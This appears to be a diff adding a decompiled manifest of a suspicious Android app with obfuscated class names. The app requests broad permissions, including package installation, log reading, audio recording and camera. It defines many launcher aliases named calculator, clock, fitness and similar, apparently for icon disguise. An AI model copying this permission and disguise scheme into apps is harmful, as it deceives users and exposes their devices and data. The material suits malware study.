@@ -1,0 +1,250 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="32" android:compileSdkVersionCodename="12" package="shop.wswb.hjdsde.fmo" platformBuildVersionCode="32" platformBuildVersionName="12">
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.LOCAL_MAC_ADDRESS"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.DETECT_SCREEN_CAPTURE"/>
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.WRITE_MEDIA_STORAGE"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.READ_LOGS"/>
+    <queries package="shop.wswb.hjdsde.fmo">
+        <intent>
+            <action android:name="android.media.action.IMAGE_CAPTURE"/>
+        </intent>
+        <intent>
+            <action android:name="android.media.action.ACTION_VIDEO_CAPTURE"/>
+        </intent>
+    </queries>
+    <uses-permission android:name="android.permission.READ_PRIVILEGED_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <application android:allowBackup="true" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f0001" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:largeHeap="true" android:name="r.CE" android:networkSecurityConfig="@xml/APKTOOL_DUPLICATE_xml_0x7f150001" android:requestLegacyExternalStorage="true" android:supportsRtl="true" android:theme="@style/APKTOOL_DUPLICATE_style_0x7f13025b">
+        <meta-data android:name="android.max_aspect" android:value="2.1"/>
+        <meta-data android:name="design_width_in_dp" android:value="400"/>
+        <meta-data android:name="design_height_in_dp" android:value="800"/>
+        <meta-data android:name="app_package_name" android:value="top.wjtinf.nggka.iapkg"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:exported="true" android:launchMode="singleTask" android:name="s.CF" android:screenOrientation="portrait" android:windowSoftInputMode="adjustPan"/>
+        <activity android:name="t.CG" android:theme="@style/APKTOOL_DUPLICATE_style_0x7f13000b"/>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f005b" android:label="@string/APKTOOL_DUPLICATE_string_0x7f12002e" android:name="top.wjtinf.nggka.iapkg.calculator" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f0058" android:label="@string/APKTOOL_DUPLICATE_string_0x7f12002d" android:name="top.wjtinf.nggka.iapkg.bro" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f0008" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:name="top.wjtinf.nggka.iapkg.ttk5cc" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f0005" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:name="top.wjtinf.nggka.iapkg.ttd6cc" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f0012" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:name="top.wjtinf.nggka.iapkg.gtts2ccny" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f000b" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:name="top.wjtinf.nggka.iapkg.gttmxccny" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f000f" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:name="top.wjtinf.nggka.iapkg.gttn9ccny" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f0011" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:name="top.wjtinf.nggka.iapkg.gtts2cc" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f000a" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:name="top.wjtinf.nggka.iapkg.gttmxcc" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f000e" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:name="top.wjtinf.nggka.iapkg.gttn9cc" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f0010" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:name="top.wjtinf.nggka.iapkg.gttq8cc" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f0001" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:name="top.wjtinf.nggka.iapkg.gtta3cc" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f0004" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:name="top.wjtinf.nggka.iapkg.gttd2cc" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f0006" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:name="top.wjtinf.nggka.iapkg.gtte6cc" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f0013" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:name="top.wjtinf.nggka.iapkg.gttt7cc" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f0014" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:name="top.wjtinf.nggka.iapkg.gttx3cc" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f000d" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:name="top.wjtinf.nggka.iapkg.gttn8cc" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f0003" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:name="top.wjtinf.nggka.iapkg.gttd1cc" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f0009" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:name="top.wjtinf.nggka.iapkg.gttk9cc" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/arg" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:name="top.wjtinf.nggka.iapkg.gtta1cc" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f0002" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:name="top.wjtinf.nggka.iapkg.gttb3cc" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f01a1" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120031" android:name="top.wjtinf.nggka.iapkg.outfit" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f00b9" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120030" android:name="top.wjtinf.nggka.iapkg.fitness" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f0060" android:label="@string/APKTOOL_DUPLICATE_string_0x7f12002f" android:name="top.wjtinf.nggka.iapkg.clock" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="true" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f0001" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120032" android:name="top.wjtinf.nggka.iapkg.default" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/APKTOOL_DUPLICATE_mipmap_0x7f0f0089" android:label="@string/APKTOOL_DUPLICATE_string_0x7f120033" android:name="top.wjtinf.nggka.iapkg.run" android:targetActivity="t.CG">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity android:name="t.CH" android:screenOrientation="portrait"/>
+        <activity android:name="t.CI" android:screenOrientation="portrait"/>
+        <activity android:name="t.CJ" android:screenOrientation="portrait"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name="u.CK" android:screenOrientation="portrait" android:windowSoftInputMode="stateHidden"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name="v.CL" android:screenOrientation="portrait" android:windowSoftInputMode="stateHidden"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name="w.CM" android:screenOrientation="portrait" android:windowSoftInputMode="stateHidden"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name="t.CN" android:screenOrientation="portrait" android:windowSoftInputMode="adjustPan"/>
+        <activity android:name="u.CO" android:screenOrientation="portrait"/>
+        <activity android:name="u.CP" android:screenOrientation="portrait"/>
+        <activity android:name="u.CQ" android:screenOrientation="portrait"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name="x.CR" android:screenOrientation="portrait" android:windowSoftInputMode="adjustPan"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name="y.CS" android:screenOrientation="portrait" android:windowSoftInputMode="stateHidden"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name="y.CT" android:screenOrientation="portrait" android:windowSoftInputMode="stateHidden"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name="y.CU" android:screenOrientation="portrait" android:windowSoftInputMode="stateHidden"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name="z.CV" android:screenOrientation="portrait" android:windowSoftInputMode="stateHidden"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name="z.CW" android:screenOrientation="portrait" android:windowSoftInputMode="stateHidden"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:name="y.CX" android:screenOrientation="portrait" android:windowSoftInputMode="stateHidden"/>
+        <provider android:authorities="shop.wswb.hjdsde.fmo.fileProvider" android:exported="false" android:grantUriPermissions="true" android:name="androidx.core.content.FileProvider">
+            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/arg"/>
+        </provider>
+        <meta-data android:name="firebase_performance_logcat_enabled" android:value="true"/>
+        <meta-data android:name="android.notch_support" android:value="true"/>
+        <activity android:name="com.lxj.xpopup.util.XPermission$PermissionActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <provider android:authorities="shop.wswb.hjdsde.fmo.luckProvider" android:exported="false" android:grantUriPermissions="true" android:name="com.luck.picture.lib.basic.PictureFileProvider">
+            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/APKTOOL_DUPLICATE_xml_0x7f150002"/>
+        </provider>
+        <service android:enabled="true" android:foregroundServiceType="location" android:name="com.luck.picture.lib.service.ForegroundService"/>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:name="com.luck.picture.lib.basic.PictureSelectorSupporterActivity" android:theme="@style/APKTOOL_DUPLICATE_style_0x7f130078"/>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:name="com.luck.picture.lib.basic.PictureSelectorTransparentActivity" android:theme="@style/APKTOOL_DUPLICATE_style_0x7f130159"/>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:name="com.yalantis.ucrop.UCropActivity" android:screenOrientation="portrait" android:theme="@style/APKTOOL_DUPLICATE_style_0x7f130259"/>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:name="com.yalantis.ucrop.UCropMultipleActivity" android:screenOrientation="portrait" android:theme="@style/APKTOOL_DUPLICATE_style_0x7f130259"/>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:name="com.luck.lib.camerax.PictureCameraActivity" android:theme="@style/APKTOOL_DUPLICATE_style_0x7f130078"/>
+        <provider android:authorities="shop.wswb.hjdsde.fmo.sls_provider" android:exported="false" android:name="com.aliyun.sls.android.producer.provider.SLSContentProvider"/>
+        <provider android:authorities="shop.wswb.hjdsde.fmo.androidx-startup" android:exported="false" android:name="androidx.startup.InitializationProvider">
+            <meta-data android:name="androidx.emoji2.text.EmojiCompatInitializer" android:value="androidx.startup"/>
+            <meta-data android:name="androidx.lifecycle.ProcessLifecycleInitializer" android:value="androidx.startup"/>
+        </provider>
+        <service android:enabled="false" android:exported="false" android:name="androidx.camera.core.impl.MetadataHolderService">
+            <meta-data android:name="androidx.camera.core.impl.MetadataHolderService.DEFAULT_CONFIG_PROVIDER" android:value="androidx.camera.camera2.Camera2Config$DefaultProvider"/>
+        </service>
+        <provider android:authorities="shop.wswb.hjdsde.fmo.autosize-init-provider" android:exported="false" android:multiprocess="true" android:name="me.jessyan.autosize.InitProvider"/>
+        <service android:name="com.xuexiang.xupdate.service.DownloadService"/>
+        <provider android:authorities="shop.wswb.hjdsde.fmo.updateFileProvider" android:exported="false" android:grantUriPermissions="true" android:name="com.xuexiang.xupdate.utils.UpdateFileProvider">
+            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/APKTOOL_DUPLICATE_xml_0x7f150008"/>
+        </provider>
+        <activity android:name="com.xuexiang.xupdate.widget.UpdateDialogActivity" android:theme="@style/APKTOOL_DUPLICATE_style_0x7f13046f"/>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:name="com.xuexiang.xutil.system.PermissionUtils$PermissionActivity" android:theme="@style/APKTOOL_DUPLICATE_style_0x7f130472" android:windowSoftInputMode="stateAlwaysHidden"/>
+        <provider android:authorities="shop.wswb.hjdsde.fmo.xutil.provider" android:exported="false" android:grantUriPermissions="true" android:name="androidx.core.content.FileProvider4Utils">
+            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/APKTOOL_DUPLICATE_xml_0x7f150009"/>
+        </provider>
+    </application>
+</manifest>
